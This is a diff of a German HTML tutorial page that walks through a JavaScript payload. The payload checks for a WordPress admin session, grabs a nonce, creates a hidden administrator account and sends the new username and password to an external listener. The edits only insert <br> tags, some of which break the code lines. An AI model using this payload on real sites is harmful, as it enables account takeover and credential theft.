@@ -996,6 +996,7 @@ Schließlich werden drei Cookies aufgelistet, die von der Seite gesetzt werden:
 <h3>Sie werden sehr ausführlich Zeile für Zeile beschrieben:</h3>
 
 
+<br>
 <hr>
 <br>
 
@@ -1177,7 +1178,7 @@ try {
             status: response.status,                      // HTTP Status Code
             type: response.type,                          // 'basic', 'cors', 'error', 'opaque', 'opaqueredirect'
             is_admin_likely: (response.status === 200 && response.url.includes('/wp-admin/index.php') && !response.url.includes('wp-login.php')),
-            redirected_to_login: (response.type === 'opaqueredirect' || (response.url && response.url.includes('wp-login.php')) || response.status === 0 || response.status === 302)
+            redirected_to_login: (response.type === 'opaqueredirect' || (response.url && response.url.includes('wp-login.php')) || response.status === 0 <br>|| response.status === 302)
         });
 
     } catch (e) {
@@ -1219,7 +1220,7 @@ indem sie das script anpassen , hier der sourcecode mit beschreibung:</b>
 
         if (!responseUserNewPage.ok || (responseUserNewPage.url && responseUserNewPage.url.includes('wp-login.php'))) {
             const responseText = await responseUserNewPage.text();
-            reportToListener('fetch_nonce_failed_or_redirected', { status: responseUserNewPage.status, redirected_to_login: true, html_sample: responseText.substring(0, 200) });
+            reportToListener('fetch_nonce_failed_or_redirected', { status: responseUserNewPage.status, redirected_to_login: true, html_sample: <br>responseText.substring(0, 200) });
             return; 
         }
         
@@ -1255,7 +1256,7 @@ indem sie das script anpassen , hier der sourcecode mit beschreibung:</b>
             }).toString()
         });
 
-        reportToListener('create_user_response', { status: createUserResponse.status, ok: createUserResponse.ok, url: createUserResponse.url, redirected: createUserResponse.redirected });
+        reportToListener('create_user_response', { status: createUserResponse.status, ok: createUserResponse.ok, url: createUserResponse.url, <br>redirected: createUserResponse.redirected });
 
         if (createUserResponse.ok || createUserResponse.redirected || createUserResponse.status === 302) { 
             reportToListener('create_user_success', { username: new_admin_user, password: new_admin_pass });
@@ -1267,7 +1268,7 @@ indem sie das script anpassen , hier der sourcecode mit beschreibung:</b>
     } catch (e) {
         reportToListener('script_fatal_error', { message: e.message, stack_sample: e.stack ? e.stack.substring(0, 300) : "No stack" });
     }
-})();
+})(); 
 </pre>
 <br>
 <hr>
